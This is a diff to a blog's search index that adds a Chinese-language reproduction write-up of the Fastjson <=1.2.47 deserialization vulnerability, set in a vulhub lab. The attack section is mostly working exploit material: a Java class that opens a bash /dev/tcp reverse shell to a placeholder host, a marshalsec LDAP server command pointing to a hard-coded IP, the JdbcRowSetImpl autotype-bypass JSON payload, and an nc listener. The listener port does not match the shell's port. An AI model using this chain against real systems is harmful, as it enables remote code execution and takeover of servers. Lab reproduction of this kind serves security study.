@@ -1,6 +1,85 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Fastjson&lt;=1.2.47反序列化漏洞复现</title>
+    <url>/2020/06/01/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>一、简介</p><pre><code>fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean</code></pre><a id="more"></a>
+
+<p>二、漏洞概述</p>
+<pre><code>首先，Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。</code></pre>
+<p>三、影响版本</p>
+<pre><code>Fastjson1.2.47以及之前的版本</code></pre>
+<p>四、环境搭建</p>
+<pre><code>使用docker和vulhub搭建漏洞环境
+1、安装compose
+pip install docker-compose
+2、下载Vulhub资源
+git clone https://github.com/vulhub/vulhub.git
+3、进入Vulhub下某个目录（根据漏洞名称或服务名称命名）
+4、启动整个环境，Docker会自动pull镜像并运行
+docker-compose up -d
+5、运行起来的环境需要查看端口，tomcat默认端口8080
+docker ps
+</code></pre>
+<p><img src="/images/pasted-63.png" alt="upload successful"></p>
+<p>五、漏洞利用<br>1、编译生成Exploit.class<br>首先将以下代码保存为Exploit.java（反弹shell命令在代码内，可自行调整）</p>
+<pre><code>
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
+public class Exploit{
+    public Exploit() throws Exception {
+        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/xx.xx.xx.xx/1888;cat <&5 2 | while read line; do $line>&5 >&5; done"});
+        InputStream is = p.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+
+        String line;
+        while((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+
+        p.waitFor();
+        is.close();
+        reader.close();
+        p.destroy();
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
+</&5></code></pre>
+<p>2、然后编译Exploit.java，会生成一个Exploit.class文件</p>
+<pre><code>javac Exploit.java</code></pre>
+<p>3、将编译生成的Exploit.class文件放至临时搭建web目录下，即浏览器访问会下载<br>使用python搭建一个临时的web服务</p>
+<pre><code>python -m SimpleHTTPServer  1111</code></pre>
+<p><img src="/images/pasted-64.png" alt="upload successful"><br>4、使用marshalsec开启LDAP服务监听（cd到marshalsec目录下执行如下命令）</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://139.180.208.54/:1111/#Exploit 9999</code></pre>
+<p><img src="/images/pasted-66.png" alt="upload successful"><br>5、访问fastjson页面Burp发包，改为POST请求，使用EXP</p>
+<pre><code>{
+    "name":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "x":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://ip:9999/Exploit",
+        "autoCommit":true
+    }
+
+}</code></pre>
+<p><img src="/images/pasted-67.png" alt="upload successful"><br>（如果不行，把上图的Content-Type改为application/json）<br>6、nc监听</p>
+<pre><code>nc -lvp 6666</code></pre>
+<p><img src="/images/pasted-65.png" alt="upload successful"><br>六、坑点<br>1、启动服务之前用 java -version查看自己的jdk版本是否低于以下jdk版本<br><img src="/images/pasted-68.png" alt="upload successful"><br>2、Content-Type改为application/json</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Apache Shiro反序列化远程代码执行复现</title>
     <url>/2020/05/08/Apache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>一、漏洞原理分析</p><pre><code>1、先看下官网漏洞说明https://issues.apache.org/jira/browse/SHIRO-550
